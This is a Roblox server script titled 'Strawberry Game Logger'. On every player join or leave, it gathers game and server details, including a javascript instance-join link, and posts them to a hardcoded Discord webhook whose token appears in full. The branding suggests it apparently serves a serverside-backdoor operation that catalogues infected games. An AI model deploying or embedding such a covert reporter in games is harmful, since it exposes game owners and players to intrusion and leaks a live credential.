local http = game:GetService("HttpService")
local players = game:GetService("Players")
local testurl = "https://api.ipify.org"
local webhook = "https://discord.com/api/webhooks/1482287481046175917/NYkva-bnem7kS7JfJCIx31z5zMHP5ufFLwxusEP4IxrjhFvgJqiNESKSTcyduPV76A1T"
local logo = "https://images-ext-1.discordapp.net/external/pub1FqQDHIsO9R6scikFlSWoqrbXsLPEU78qZu9DObU/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1375937528032661566/79feee24a3e4be0bdd04a971b058edb0.webp?format=webp"

local function getdata()
	local success,err = pcall(function()
		return http:GetAsync(testurl)
	end)
	if success then
		local success,response = pcall(function()
			return http:GetAsync("https://games.roproxy.com/v1/games?universeIds="..tostring(game.GameId))
		end)
		local thumbsuccess,thumbresponse = pcall(function()
			return http:GetAsync("https://thumbnails.roproxy.com/v1/games/icons?universeIds="..tostring(game.GameId).."&size=512x512&format=Png&isCircular=false")
		end)
		local data = http:JSONDecode(response).data[1]
		return {
			GameName = data.name,
			Thumbnail = http:JSONDecode(thumbresponse).data[1].imageUrl,
			GameLink = "https://www.roblox.com/games/"..game.PlaceId,
			Javascript = string.format("```js\njavascript:Roblox.GameLauncher.joinGameInstance(%d,\"%s\")\n```",game.PlaceId,game.JobId),
			Playing = data.playing,
			ServerPlayers = #players:GetPlayers(),
			MaxPlayers = players.MaxPlayers,
			Genre = data.genre,
			Visits = data.visits,
			Favorites = data.favoritedCount,
			Copying = data.copyingAllowed,
			Created = response.Created,
			Updated = response.Updated,
			Creator = {
				Type = data.creator.type,
				Name = data.creator.name,
				ID = data.creator.id
			}
		}
	end
end

local function log()
	local data = getdata()
	local time = os.date("%I:%M %p")
	local creatorurl = ""
	if data.Creator.Type == "User" then
		creatorurl = "https://roblox.com/users/"..tostring(data.Creator.ID)
	else
		creatorurl = "https://roblox.com/communities/"..tostring(data.Creator.ID)
	end
	local embed = {
		embeds = {{
			color = 16407390,
			author = {
				name = "Strawberry Game Logger",
				icon_url = logo
			},
			footer = {
				text = "Strawberry Serverside  •  "..time,
				icon_url = logo
			},
			thumbnail = {
				url = data.Thumbnail
			},
			description = "**["..data.GameName.."]("..data.GameLink..")**\n"..
				"* Game Information\n"..
				"> **Players:** "..tostring(data.Playing).."\n"..
				"> **Visits:** "..tostring(data.Visits).."\n"..
				"> **Favorites:** "..tostring(data.Favorites).."\n"..
				"> **Creator:** "..tostring("[@"..data.Creator.Name.."]("..creatorurl..")").."\n"..
				"* Server Information\n"..
				"> **Players:** "..tostring(data.ServerPlayers).."/"..tostring(data.MaxPlayers).."\n"..
				"> **Javascript:**\n"..data.Javascript
		}}
	}
	http:PostAsync(webhook,http:JSONEncode(embed),Enum.HttpContentType.ApplicationJson)
end

log()
players.PlayerAdded:Connect(log)
players.PlayerRemoving:Connect(log)
